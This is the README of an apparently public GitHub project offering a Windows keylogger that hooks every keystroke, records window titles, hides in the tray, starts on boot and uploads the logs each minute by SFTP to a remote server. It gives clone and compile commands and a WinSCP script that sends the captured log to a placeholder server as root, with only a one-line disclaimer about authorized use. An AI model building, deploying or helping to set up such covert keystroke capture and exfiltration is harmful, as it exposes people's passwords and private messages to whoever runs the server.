# Keyboardhook - 键盘监听与日志上传系统 / Keyboard Monitoring and Log Upload System

![Stars](https://img.shields.io/github/stars/A1LinLin1/Keyboardhook?style=social)
![Forks](https://img.shields.io/github/forks/A1LinLin1/Keyboardhook?style=social)
![Issues](https://img.shields.io/github/issues/A1LinLin1/Keyboardhook)
![GitHub](https://img.shields.io/github/license/A1LinLin1/Keyboardhook)

该项目是一个 Windows 系统下的键盘监听程序，具有以下特点：  
**This project is a keyboard hook and log uploader for Windows, featuring:**

- ✅ 键盘全局 Hook（记录按键，支持大小写和组合键）  
  ✅ Global keyboard hook with case sensitivity and combo key support
- ✅ 自动记录活动窗口标题及时间戳  
  ✅ Automatically logs active window title and timestamp
- ✅ 日志文件命名为当前主机 IP（如 `192.168.1.100.txt`）  
  ✅ Log file named after current IP address (e.g., `192.168.1.100.txt`)
- ✅ 每分钟自动上传日志到远程服务器（支持 SSH 私钥认证）  
  ✅ Auto-upload log via SSH every minute
- ✅ 支持托盘最小化、开机自启动（Windows）  
  ✅ Tray icon & auto-start on Windows
- ✅ 项目代码支持跨平台管理（macOS 可管理源码）  
  ✅ Cross-platform repo management (macOS friendly)

---

## 🔧 本地配置指南（Windows） / Setup Instructions (Windows)

### 1️⃣ 克隆仓库 / Clone repository
```bash
git clone https://github.com/A1LinLin1/Keyboardhook.git
cd Keyboardhook
```

### 2️⃣ 准备编译环境 / Set up compiler environment
- 使用 Visual Studio 的 x86 Native Tools Command Prompt  
  Use Visual Studio x86 Native Tools Command Prompt
- 确保 `cl.exe` 可用 / Make sure `cl.exe` is available

### 3️⃣ 编译项目 / Compile project
```bash
cl /LD myhook.cpp user32.lib shell32.lib ws2_32.lib iphlpapi.lib
cl monitor.cpp user32.lib shell32.lib
```

---

## 🚀 程序运行说明 / How to Run

1. 执行 `monitor.exe` 启动钩子  
   Run `monitor.exe` to start key hook
2. 日志文件将自动生成，以本机 IP 命名  
   Log file named by your local IP address
3. 每分钟自动上传日志至 `/home/monitor/`  
   Uploads log every minute to `/home/monitor/`
4. 通过 WinSCP 执行 upload 脚本上传  
   Uses WinSCP and dynamic `upload.txt` script

---

## 🔐 SSH 上传配置 / SSH Upload Setup

1. 使用 `puttygen.exe` 生成 `.ppk` 密钥  
   Use `puttygen.exe` to generate `.ppk` private key
2. 添加公钥至服务器 `~/.ssh/authorized_keys`  
   Add public key to remote server
3. 将 `.ppk` 存入 `keys/my_id_rsa.ppk`  
   Place `.ppk` in `keys/`
4. WinSCP 命令如下 / Upload command example:
```txt
open sftp://root@YOUR_SERVER_IP/ -privatekey="keys/my_id_rsa.ppk" -hostkey="ssh-ed25519 255 YOUR-HOST-KEY"
put "192.168.1.100.txt" /home/monitor/
exit
```

---

## 📁 项目结构说明 / Project Structure
```
.
├── myhook.cpp        # DLL 源码 / Hook + Upload logic
├── monitor.cpp       # 主程序 / Main GUI
├── myhook.dll        # 编译输出 / Compiled DLL
├── monitor.exe       # 托盘程序 / Compiled EXE
├── upload.txt        # 上传脚本 / Upload script
├── upload.log        # 上传日志 / Upload log
├── keys/             # 私钥存放目录 / SSH keys
├── WinSCP.exe/.com   # 上传工具 / WinSCP binary
└── README.md         # 当前文件 / This file
```

---

## ⚠️ 安全与合规提醒 / Disclaimer

本项目仅用于教学和授权测试用途，不得用于非法行为。  
**This tool is for educational and authorized testing only. Do NOT use it for unauthorized surveillance or keylogging.**

---

## ✨ 作者信息 / Author

- GitHub: [@A1LinLin1](https://github.com/A1LinLin1)  
- Email: ch1001@bupt.edu.cn  
- 开始时间 / Started: 2025-03-30

---

> MIT License | Made with ❤️ by A1LinLin1

